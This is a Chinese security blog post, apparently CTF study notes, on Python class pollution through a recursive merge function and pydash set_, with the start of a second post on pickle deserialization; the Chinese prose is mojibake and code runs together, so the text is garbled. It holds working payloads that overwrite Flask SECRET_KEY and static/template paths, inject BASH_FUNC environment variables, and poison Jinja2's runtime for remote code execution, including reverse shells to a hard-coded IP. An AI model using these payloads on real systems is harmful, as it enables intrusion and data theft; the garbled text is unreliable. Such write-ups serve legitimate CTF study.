¼å¼å¹¶æ²¡æœ‰å…ƒç»„è¿™ä¸€æ•°æ®ç±»å‹è®¾è®¡æ¦‚å¿µï¼Œè¿™å°±éœ€è¦ç¯å¢ƒä¸­æœ‰åˆé€‚çš„è§£æè¾“å…¥çš„æ–¹å¼ 123456789101112131415161718192021222324252627282930313233343536373839404142def evilFunc(arg_1 , shell = False): if not shell: print(arg_1) else: print(__import__(&quot;os&quot;).popen(arg_1).read())class cls: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = cls()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;evilFunc&quot; : { &quot;__defaults__&quot; : ( True , ) } } }}evilFunc(&quot;whoami&quot;)#whoamimerge(payload, instance)evilFunc(&quot;whoami&quot;)#article-kelp __kwdefaults____kwdefaults__ä»¥å­—å…¸çš„å½¢å¼æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ”¶å½•äº†å‡½æ•°é”®å€¼å½¢å‚çš„é»˜è®¤å€¼ï¼Œä»ä»£ç ä¸Šæ¥çœ‹ï¼Œåˆ™æ˜¯å¦‚ä¸‹çš„æ•ˆæœï¼š 1234567891011121314151617181920def func_a(var_1, var_2 =2, var_3 = 3): passdef func_b(var_1, /, var_2 =2, var_3 = 3): passdef func_c(var_1, var_2 =2, *, var_3 = 3): passdef func_d(var_1, /, var_2 =2, *, var_3 = 3): passprint(func_a.__kwdefaults__)#Noneprint(func_b.__kwdefaults__)#Noneprint(func_c.__kwdefaults__)#{'var_3': 3}print(func_d.__kwdefaults__)#{'var_3': 3} é€šè¿‡æ›¿æ¢è¯¥å±æ€§ä¾¿èƒ½å®ç°å¯¹å‡½æ•°é”®å€¼å½¢å‚çš„é»˜è®¤å€¼æ›¿æ¢ 12345678910111213141516171819202122232425262728293031323334353637383940def evilFunc(arg_1 , * , shell = False): if not shell: print(arg_1) else: print(__import__(&quot;os&quot;).popen(arg_1).read())class cls: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = cls()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;evilFunc&quot; : { &quot;__kwdefaults__&quot; : { &quot;shell&quot; : True } } } }}evilFunc(&quot;whoami&quot;) #whoamimerge(payload, instance)evilFunc(&quot;whoami&quot;) #article-kelp ç‰¹å®šå€¼æ›¿æ¢__file__DSACTF2023ä¸ƒæœˆæš‘æœŸèµ›â€“EzFlaskä¸­å­˜åœ¨ä¸‹é¢è¿™æ®µä»£ç ï¼Œ 123@app.route('/',methods=['GET']) def index(): return open(__file__, &quot;r&quot;).read() å…¶ä¸­å­˜åœ¨mergeå‡½æ•°ï¼›__init__ç­‰è¢«è¿‡æ»¤ï¼›ä½¿ç”¨unioncodeè¿›è¡Œç»•è¿‡ï¼Œæ³¨æ„ï¼š__file__æ˜¯__globals__ä¸‹çš„ä¸€ä¸ªå±æ€§ï¼Œè¡¨ç¤ºå½“å‰æ–‡ä»¶è·¯å¾„ï¼›å¦‚æœå¯ä»¥ä¿®æ”¹__file__ï¼›é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ 123456def test(): passprint(test.__globals__['__file__']) #D:\\Project\\ctf\\test3.pytest.__globals__['__file__'] = &quot;/flag&quot;print(test.__globals__['__file__']) #/flag os.environ[]å¦‚æœå¯ä»¥å¾—åˆ°osæ¨¡å—ï¼Œå¹¶ä¸”å­˜åœ¨åŸå‹æ±¡æŸ“ï¼›é‚£ä¹ˆå¯ä»¥é€šè¿‡os.environå¾€ç¯å¢ƒå˜é‡æ³¨å…¥å€¼ï¼› 123import osos.environ['test'] = &quot;TEST&quot;print(os.environ['test']) #TEST é‚£ä¹ˆå¯ä»¥åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼›å…·ä½“ç¯å¢ƒå˜é‡æ³¨å…¥åŸç†è¿˜æ˜¯çœ‹pç¥åšå®¢ï¼› 1234import subprocessimport osos.environ['BASH_FUNC_echo%%']='() { id; }'subprocess.run('echo &quot;aaa&quot;', shell=True, executable='/bin/bash') 12345import osos.environ[&quot;BASH_FUNC_echo%%&quot;] = '() { id; }'os.system(&quot;/bin/bash -c 'echo \\&quot;aaa\\&quot;'&quot;) è¿™é‡Œéœ€è¦æ³¨æ„ä¸€äº›ç¯å¢ƒåŸå› ï¼Œæ¯”å¦‚æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ,æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬å·ï¼›è¿˜æœ‰ä¸€äº›ç„å­¦ï¼Œæˆ‘ç”¨os.systemåœ¨æˆ‘çš„kaliæœºæ²¡æœ‰æˆåŠŸï¼Œä½†æ˜¯subprocess.runæ ·å¼æˆåŠŸäº†ï¼Œè€Œä¸”æˆ‘ç”¨kaliå¼€ä¸ªdockerï¼Œåœ¨dockerä¸­è¿è¡Œos.systemæ ·å¼ä¹Ÿå¯ä»¥æˆåŠŸ 12env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello' env $'BASH_FUNC_echo()=() { id; }' bash -c &quot;echo hello&quot; ç±»ä¼¼å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041import osdef test(): passclass a: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: print(dst) setattr(dst, k, v)instance = a()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;os&quot;:{ &quot;environ&quot;:{ &quot;BASH_FUNC_echo%%&quot;:&quot;() { /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/81.71.13.76/5555 0&gt;&amp;1'; }&quot; } } } } }merge(payload,instance)os.system(&quot;/bin/bash -c 'echo \\&quot;aaa\\&quot;'&quot;) flaskç›¸å…³ç‰¹å®šå±æ€§SECRET_KEYå†³å®šflaskçš„sessionç”Ÿæˆçš„é‡è¦å‚æ•°ï¼ŒçŸ¥é“è¯¥å‚æ•°å¯ä»¥å®ç°sessionä»»æ„ä¼ªé€  ç»™å‡ºç¤ºèŒƒç¯å¢ƒå¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334#app.pyfrom flask import Flask,requestimport jsonapp = Flask(__name__)def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class cls(): def __init__(self): passinstance = cls()@app.route('/',methods=['POST', 'GET'])def index(): if request.data: merge(json.loads(request.data), instance) return &quot;[+]Config:%s&quot;%(app.config['SECRET_KEY']) app.run(host=&quot;0.0.0.0&quot;) æ­£å¸¸è®¿é—® ä½¿ç”¨å¦‚ä¸‹çš„Payloadï¼š 1234567891011{ &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;app&quot; : { &quot;config&quot; : { &quot;SECRET_KEY&quot; :&quot;Polluted~&quot; } } } }} _got_first_requestç”¨äºåˆ¤å®šæ˜¯å¦æŸæ¬¡è¯·æ±‚ä¸ºè‡ªFlaskå¯åŠ¨åç¬¬ä¸€æ¬¡è¯·æ±‚ï¼Œæ˜¯Flask.got_first_requestå‡½æ•°çš„è¿”å›å€¼ï¼Œæ­¤å¤–è¿˜ä¼šå½±å“è£…é¥°å™¨app.before_first_requestçš„è°ƒç”¨ï¼Œä¾æ®æºç å¯ä»¥çŸ¥é“_got_first_requestå€¼ä¸ºå‡æ—¶æ‰ä¼šè°ƒç”¨ï¼š ç»™å‡ºç¤ºèŒƒç¯å¢ƒå¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344from flask import Flask,requestimport jsonapp = Flask(__name__)def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class cls(): def __init__(self): passinstance = cls()flag = &quot;Is flag here?&quot;@app.before_first_requestdef init(): global flag if hasattr(app, &quot;special&quot;) and app.special == &quot;U_Polluted_It&quot;: flag = open(&quot;flag&quot;, &quot;rt&quot;).read()@app.route('/',methods=['POST', 'GET'])def index(): if request.data: merge(json.loads(request.data), instance) global flag setattr(app, &quot;special&quot;, &quot;U_Polluted_It&quot;) return flagapp.run(host=&quot;0.0.0.0&quot;)#flagflag{U_Find_Me} before_first_requestä¿®é¥°çš„initå‡½æ•°åªä¼šåœ¨ç¬¬ä¸€æ¬¡è®¿é—®å‰è¢«è°ƒç”¨ï¼Œè€Œå…¶ä¸­è¯»å–flagçš„é€»è¾‘åˆéœ€è¦è®¿é—®è·¯ç”±/åæ‰èƒ½è§¦å‘ï¼Œè¿™å°±æ„æˆäº†çŸ›ç›¾ã€‚æ‰€ä»¥éœ€è¦ä½¿ç”¨payloadåœ¨è®¿é—®/åé‡ç½®_got_first_requestå±æ€§å€¼ä¸ºå‡ï¼Œè¿™æ ·before_first_requestæ‰ä¼šå†æ¬¡è°ƒç”¨ã€‚ payload 123456789{ &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;app&quot;:{ &quot;_got_first_request&quot;:false } } }} _static_url_pathè¿™ä¸ªå±æ€§ä¸­å­˜æ”¾çš„æ˜¯flaskä¸­é™æ€ç›®å½•çš„å€¼ï¼Œé»˜è®¤è¯¥å€¼ä¸ºstaticã€‚è®¿é—®flaskä¸‹çš„èµ„æºå¯ä»¥é‡‡ç”¨å¦‚http://domain/static/xxxï¼Œè¿™æ ·å®é™…ä¸Šå°±ç›¸å½“äºè®¿é—®_static_url_pathç›®å½•ä¸‹xxxçš„æ–‡ä»¶å¹¶å°†è¯¥æ–‡ä»¶å†…å®¹ä½œä¸ºå“åº”å†…å®¹è¿”å› 1234567#static/index.html&lt;html&gt;&lt;h1&gt;hello&lt;/h1&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt; 123456789101112131415161718192021222324252627282930313233#app.pyfrom flask import Flask,requestimport jsonapp = Flask(__name__)def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class cls(): def __init__(self): passinstance = cls()@app.route('/',methods=['POST', 'GET'])def index(): if request.data: merge(json.loads(request.data), instance) return &quot;flag in ./flag but heres only static/index.html&quot;app.run(host=&quot;0.0.0.0&quot;) 123#flagflag{U_Find_Me} æ­¤æ—¶http://domain/static/xxxåªèƒ½è®¿é—®åˆ°æ–‡ä»¶ç³»ç»Ÿå½“å‰ç›®å½•ä¸‹staticç›®å½•ä¸­çš„xxxæ–‡ä»¶ï¼Œå¹¶ä¸”ä¸å­˜åœ¨å¦‚ç›®å½•ç©¿è¶Šçš„æ¼æ´ æ±¡æŸ“è¯¥å±æ€§ä¸ºå½“å‰ç›®å½•ã€‚è¿™æ ·å°±èƒ½è®¿é—®åˆ°å½“å‰ç›®å½•ä¸‹çš„flagæ–‡ä»¶äº† 123456789{ &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;app&quot;:{ &quot;_static_url_path&quot;:&quot;./&quot; } } }} os.path.pardirè¿™ä¸ªosæ¨¡å—ä¸‹çš„å˜é‡ä¼šå½±å“flaskçš„æ¨¡æ¿æ¸²æŸ“å‡½æ•°render_templateçš„è§£æï¼Œæ‰€ä»¥ä¹Ÿæ”¶å½•åœ¨flaskéƒ¨åˆ†ï¼Œæ¨¡æ‹Ÿçš„ç¯å¢ƒå¦‚ä¸‹ï¼š 1234567#templates/index.html&lt;html&gt;&lt;h1&gt;hello&lt;/h1&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041#app.pyfrom flask import Flask,request,render_templateimport jsonimport osapp = Flask(__name__)def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class cls(): def __init__(self): passinstance = cls()@app.route('/',methods=['POST', 'GET'])def index(): if request.data: merge(json.loads(request.data), instance) return &quot;flag in ./flag but u just can use /file to vist ./templates/file &quot;+os.path.pardir@app.route(&quot;/&lt;path:path&gt;&quot;)def render_page(path): if not os.path.exists(&quot;templates/&quot; + path): return &quot;templates/&quot; + path+&quot; not found&quot;, 404 return render_template(path)app.run(host=&quot;0.0.0.0&quot;) 123#flagflag{U_Find_Me} ç›´æ¥è®¿é—®http://domain/xxxæ—¶ä¼šä½¿ç”¨render_tempaltesæ¸²æŸ“templates/xxxæ–‡ä»¶ å¦‚æœå°è¯•ç›®å½•ç©¿è¶Šåˆ™ä¼šå¯¼è‡´render_templateå‡½æ•°æŠ¥é”™ os.path.pardirå€¼é»˜è®¤å³ä¸º..ï¼Œæ‰€ä»¥åªè¦ä¿®æ”¹è¯¥å±æ€§ä¸ºä»»æ„å…¶ä»–å€¼å³å¯é¿å…æŠ¥é”™ï¼Œä»è€Œå®ç°render_templateå‡½æ•°çš„ç›®å½•ç©¿è¶Š 1234567891011{ &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;os&quot;:{ &quot;path&quot;:{ &quot;pardir&quot;:&quot;!&quot; } } } }} è®°å¾—ä¿®æ”¹ 1Content-Type: application/json æ¨¡æ¿ç¼–è¯‘æ—¶çš„å˜é‡åœ¨flaskä¸­å¦‚ä½¿ç”¨render_templateæ¸²æŸ“ä¸€ä¸ªæ¨¡æ¿å®é™…ä¸Šç»å†äº†å¤šä¸ªé˜¶æ®µçš„å¤„ç†ï¼Œå…¶ä¸­ä¸€ä¸ªé˜¶æ®µæ˜¯å¯¹æ¨¡æ¿ä¸­çš„Jinjaè¯­æ³•è¿›è¡Œè§£æè½¬åŒ–ä¸ºASTï¼Œè€Œåœ¨è¯­æ³•æ ‘çš„æ ¹éƒ¨å³Lib/site-packages/jinja2/compiler.pyä¸­CodeGeneratorç±»çš„visit_Templateæ–¹æ³•çº¯åœ¨ä¸€æ®µæœ‰è¶£çš„é€»è¾‘ è¯¥é€»è¾‘ä¼šå‘è¾“å‡ºæµå†™å…¥ä¸€æ®µæ‹¼æ¥çš„ä»£ç ï¼ˆè¾“å‡ºæµä¸­ä»£ç æœ€ç»ˆä¼šè¢«ç¼–è¯‘è¿›è€Œæ‰§è¡Œï¼‰ï¼Œæ³¨æ„å…¶ä¸­çš„exported_nameså˜é‡ï¼Œè¯¥å˜é‡ä¸º.runtimeæ¨¡å—ï¼ˆå³Lib/site-packages/jinja2/runtime.pyï¼‰ä¸­å¯¼å…¥çš„å˜é‡exportedå’Œasync_exportedç»„åˆåå¾—åˆ°ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡æ±¡æŸ“.runtimeæ¨¡å—ä¸­è¿™ä¸¤ä¸ªå˜é‡å®ç°RCEã€‚ç”±äºè¿™æ®µé€»è¾‘æ˜¯æ¨¡æ¿æ–‡ä»¶è§£æè¿‡ç¨‹ä¸­å¿…ç»çš„æ­¥éª¤ä¹‹ä¸€ï¼Œæ‰€ä»¥è¿™å°±æ„å‘³ç€åªè¦æ¸²æŸ“ä»»æ„çš„æ–‡ä»¶å‡èƒ½é€šè¿‡æ±¡æŸ“è¿™ä¸¤å±æ€§å®ç°RCEã€‚ ç»™å‡ºæ¨¡æ‹Ÿçš„ç¯å¢ƒå¦‚ä¸‹ï¼š 1234567#templates/index.html&lt;html&gt;&lt;h1&gt;nt here~&lt;/h1&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334#app.pyfrom flask import Flask,request,render_templateimport jsonapp = Flask(__name__)def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class cls(): def __init__(self): passinstance = cls()@app.route('/',methods=['POST', 'GET'])def index(): if request.data: merge(json.loads(request.data), instance) return render_template(&quot;index.html&quot;)app.run(host=&quot;0.0.0.0&quot;) 12#static/#æ˜¯ä¸ªç©ºç›®å½•,æ–¹ä¾¿ç›´æ¥åˆ©ç”¨staticç›®å½•è¯»å–flag 123#flagflag{U_Find_Me} ä½†æ˜¯éœ€è¦æ³¨æ„æ’å…¥payloadçš„ä½ç½®æ˜¯ASTçš„æ ¹éƒ¨åˆ†ï¼Œæ˜¯ä½œä¸ºæ¨¡æ¿ç¼–è¯‘æ—¶çš„å¤„ç†ä»£ç çš„ä¸€éƒ¨åˆ†ï¼ŒåŒæ ·å—åˆ°æ¨¡æ¿ç¼“å­˜çš„å½±å“ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œæ’å…¥çš„payloadåªä¼šåœ¨æ¨¡æ¿åœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶è§¦å‘ payload è®°å¾—ä¿®æ”¹å¦‚ä¸‹ï¼Œå› ä¸ºæºç ä¸­ç”¨äº†json.loadså‡½æ•° 1Content-Type: application/json èµ‹å€¼flagåˆ°staticç›®å½•ä¸‹ 1234567891011121314151617181920212223{ &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;__loader__&quot;: { &quot;__init__&quot;: { &quot;__globals__&quot;:{ &quot;sys&quot;: { &quot;modules&quot; : { &quot;jinja2&quot; : { &quot;runtime&quot; : { &quot;exported&quot;: [ &quot;*;__import__('os').system('cp ./flag ./static/flag');#&quot; ] } } } } } } } } }} åœ¨å‡ºç½‘çš„æƒ…å†µä¸‹ï¼Œç›´æ¥åå¼¹shell 1234567891011121314151617181920212223{ &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;__loader__&quot;: { &quot;__init__&quot;: { &quot;__globals__&quot;:{ &quot;sys&quot;: { &quot;modules&quot; : { &quot;jinja2&quot; : { &quot;runtime&quot; : { &quot;exported&quot;: [ &quot;*;__import__('os').system('/bin/bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5555 0&gt;&amp;1\\&quot;');#&quot; ] } } } } } } } } }} åå¼¹æˆåŠŸ Pydashä¾æ®åŸåšä¸»æ‰€è¿°ï¼Œç›®å‰å‘ç°äº†Pydashæ¨¡å—ä¸­çš„set_å’Œset_withå‡½æ•°å…·æœ‰å¦‚ä¸Šå®ä¾‹ä¸­mergeå‡½æ•°ç±»ä¼¼çš„ç±»å±æ€§èµ‹å€¼é€»è¾‘ï¼Œèƒ½å¤Ÿå®ç°æ±¡æŸ“æ”»å‡»ã€‚idekctf 2022*ä¸­çš„task managerè¿™é¢˜å°±è®¾è®¡ä½¿ç”¨è¯¥å‡½æ•°æä¾›å¯ä»¥æ±¡æŸ“çš„ç¯å¢ƒ 123456from pydash import set_data = {'a': {'b': {'c': 3}}}set_(data, 'a.b.c', 4)print(data) # è¾“å‡º {'a': {'b': {'c': 4}}} set_12345678910111213141516171819202122232425from pydash import set_class father: secret = &quot;haha&quot;class son_a(father): passclass son_b(father): passinstance = son_b()payload = { &quot;__class__&quot; : { &quot;__base__&quot; : { &quot;secret&quot; : &quot;no way&quot; } }}print(son_a.secret) #hahaprint(instance.secret) #hahaset_(instance,&quot;__class__.__base__.secret&quot;,&quot;no way&quot;)print(son_a.secret) #no wayprint(instance.secret) #no way set_with12345678910111213141516171819202122232425from pydash import set_withclass father: secret = &quot;haha&quot;class son_a(father): passclass son_b(father): passinstance = son_b()payload = { &quot;__class__&quot; : { &quot;__base__&quot; : { &quot;secret&quot; : &quot;no way&quot; } }}print(son_a.secret) #hahaprint(instance.secret) #hahaset_with(instance,&quot;__class__.__base__.secret&quot;,&quot;no way&quot;)print(son_a.secret) #no wayprint(instance.secret) #no way","link":"/2024/02/03/python%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/"},{"title":"pythonååºåˆ—åŒ–","text":"å‰è¨€å­¦ä¹ pythonååºåˆ—åŒ–æ¼æ´ï¼›æ€»ç»“äº†ä¸€äº›å¤§ä½¬çš„åšå®¢ï¼›æ‰€ä»¥æœ¬æ–‡å¤§éƒ¨åˆ†å†…å®¹éƒ½æ¥è‡ªå‚è€ƒåšå®¢ï¼› æœ¬æ–‡å‚è€ƒï¼špickleååºåˆ—åŒ–åˆæ¢,python pickle ååºåˆ—åŒ–æ€»ç»“,pythonååºåˆ—åŒ–æ¼æ´ pickleç®€ä»‹ ä¸PHPç±»ä¼¼ï¼Œpythonä¹Ÿæœ‰åºåˆ—åŒ–åŠŸèƒ½ä»¥é•¿æœŸå‚¨å­˜å†…å­˜ä¸­çš„æ•°æ®ã€‚pickleæ˜¯pythonä¸‹çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åŒ…ã€‚ pythonæœ‰å¦ä¸€ä¸ªæ›´åŸå§‹çš„åºåˆ—åŒ–åŒ…marshalï¼Œç°åœ¨å¼€å‘æ—¶ä¸€èˆ¬ä½¿ç”¨pickleã€‚ ä¸jsonç›¸æ¯”ï¼Œpickleä»¥äºŒè¿›åˆ¶å‚¨å­˜ï¼Œä¸æ˜“äººå·¥é˜…è¯»ï¼›jsonå¯ä»¥è·¨è¯­è¨€ï¼Œè€Œpickleæ˜¯Pythonä¸“ç”¨çš„ï¼›pickleèƒ½è¡¨ç¤ºpythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œjsonåªèƒ½è¡¨ç¤ºä¸€éƒ¨åˆ†å†…ç½®ç±»å‹ä¸”ä¸èƒ½è¡¨ç¤ºï¼Ÿè‡ªå®šä¹‰ç±»å‹ã€‚ pickleå®é™…ä¸Šå¯ä»¥çœ‹ä½œä¸€ç§ç‹¬ç«‹çš„è¯­è¨€ï¼Œé€šè¿‡å¯¹opcodeçš„æ›´æ”¹ç¼–å†™å¯ä»¥æ‰§è¡Œpythonä»£ç ã€è¦†ç›–å˜é‡ç­‰æ“ä½œã€‚ç›´æ¥ç¼–å†™çš„opcodeçµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ï¼Œæœ‰çš„ä»£ç ä¸èƒ½é€šè¿‡pickleåºåˆ—åŒ–å¾—åˆ°ï¼ˆpickleè§£æèƒ½åŠ›å¤§äºpickleç”Ÿæˆèƒ½åŠ›ï¼‰ã€‚ object.__reduce__() å‡½æ•° åœ¨å¼€å‘æ—¶ï¼Œå¯ä»¥é€šè¿‡é‡å†™ç±»çš„ object.__reduce__() å‡½æ•°ï¼Œä½¿ä¹‹åœ¨è¢«å®ä¾‹åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œã€‚å…·ä½“è€Œè¨€ï¼Œpythonè¦æ±‚ object.__reduce__() è¿”å›ä¸€ä¸ª (callable, ([para1,para2...])[,...]) çš„å…ƒç»„ï¼Œæ¯å½“è¯¥ç±»çš„å¯¹è±¡è¢«unpickleæ—¶ï¼Œè¯¥callableå°±ä¼šè¢«è°ƒç”¨ä»¥ç”Ÿæˆå¯¹è±¡ï¼ˆè¯¥callableå…¶å®æ˜¯æ„é€ å‡½æ•°ï¼‰ã€‚ åœ¨ä¸‹æ–‡pickleçš„opcodeä¸­ï¼Œ R çš„ä½œç”¨ä¸ object.__reduce__() å…³ç³»å¯†åˆ‡ï¼šé€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°ã€‚å…¶å® R æ­£å¥½å¯¹åº” object.__reduce__() å‡½æ•°ï¼Œ object.__reduce__() çš„è¿”å›å€¼ä¼šä½œä¸º R çš„ä½œç”¨å¯¹è±¡ï¼Œå½“åŒ…å«è¯¥å‡½æ•°çš„å¯¹è±¡è¢«pickleåºåˆ—åŒ–æ—¶ï¼Œå¾—åˆ°çš„å­—ç¬¦ä¸²æ˜¯åŒ…å«äº† R çš„ã€‚ opcodeç®€ä»‹opcodeç‰ˆæœ¬pickleç”±äºæœ‰ä¸åŒçš„å®ç°ç‰ˆæœ¬ï¼Œåœ¨py3å’Œpy2ä¸­å¾—åˆ°çš„opcodeä¸ç›¸åŒã€‚ä½†æ˜¯pickleå¯ä»¥å‘ä¸‹å…¼å®¹ï¼ˆæ‰€ä»¥ç”¨v0å°±å¯ä»¥åœ¨æ‰€æœ‰ç‰ˆæœ¬ä¸­æ‰§è¡Œï¼‰ã€‚ç›®å‰ï¼Œpickleæœ‰6ç§ç‰ˆæœ¬ã€‚ 12345678910111213141516# coding=utf-8import picklea={'1': 1, '2': 2}print(f'# åŸå˜é‡ï¼š{a!r}')for i in range(6): print(f'pickleç‰ˆæœ¬{i}',pickle.dumps(a,protocol=i)) # åŸå˜é‡ï¼š{'1': 1, '2': 2}# pickleç‰ˆæœ¬0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.'# pickleç‰ˆæœ¬1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.'# pickleç‰ˆæœ¬2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.'# pickleç‰ˆæœ¬3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.'# pickleç‰ˆæœ¬4 b'\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.'# pickleç‰ˆæœ¬5 b'\\x80\\x05\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.' è¿™é‡Œæœ‰ä¸ªå°æŠ€å·§ï¼Œå¦‚æœé¢˜ç›®è¿‡æ»¤äº†\\n;åœ¨pickleç‰ˆæœ¬4ä»¥ä¸Šæ²¡æœ‰\\n pickletoolsä½¿ç”¨pickletoolså¯ä»¥æ–¹ä¾¿çš„å°†opcodeè½¬åŒ–ä¸ºä¾¿äºè‚‰çœ¼è¯»å–çš„å½¢å¼ã€‚ 12345678910111213141516171819202122232425262728293031import pickleimport pickletoolsclass test: def __init__(self): self.people = 'lituer'a = test()serialized = pickle.dumps(a, protocol=3) # æŒ‡å®šPVM åè®®ç‰ˆæœ¬print(serialized)unserialized = pickle.loads(serialized) # æ³¨æ„ï¼Œloads èƒ½å¤Ÿè‡ªåŠ¨è¯†åˆ«ååºåˆ—åŒ–çš„ç‰ˆæœ¬print(unserialized.people)pickletools.dis(serialized)# b'\\x80\\x03c__main__\\ntest\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00peopleq\\x03X\\x06\\x00\\x00\\x00lituerq\\x04sb.'# lituer# 0: \\x80 PROTO 3# 2: c GLOBAL '__main__ test'# 17: q BINPUT 0# 19: ) EMPTY_TUPLE# 20: \\x81 NEWOBJ# 21: q BINPUT 1# 23: } EMPTY_DICT# 24: q BINPUT 2# 26: X BINUNICODE 'people'# 37: q BINPUT 3# 39: X BINUNICODE 'lituer'# 50: q BINPUT 4# 52: s SETITEM# 53: b BUILD# 54: . STOP# highest protocol among opcodes = 2 å¯è¯»æ€§è¾ƒå¼º;æƒ³è¦å¼„æ‡‚è¿™ä¸ªå›æ˜¾çš„å…·ä½“å†…å®¹ï¼Œæˆ‘ä»¬è¿˜è¦å¼„å¾—ä¸€ä¸ªä¸œè¥¿ï¼ŒPVM PVMæˆ‘ä»¬åœ¨ä½¿ç”¨picklerçš„æ—¶å€™ï¼Œæˆ‘ä»¬è¦åºåˆ—åŒ–çš„å†…å®¹ï¼Œå¿…é¡»ç»è¿‡PVMï¼ŒPickle Virtual Machine (PVM)æ˜¯Pythonè¯­è¨€ä¸­çš„ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œç”¨äºåºåˆ—åŒ–å’Œååºåˆ—åŒ–Pythonå¯¹è±¡ã€‚å®ƒæ˜¯Pythonæ ‡å‡†åº“ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œç”±Pythonçš„pickleæ¨¡å—æä¾›æ”¯æŒã€‚ä¸‹é¢æ˜¯Pickle Virtual Machineçš„è¿è¡ŒåŸç†ï¼š ç”Ÿæˆæ“ä½œç 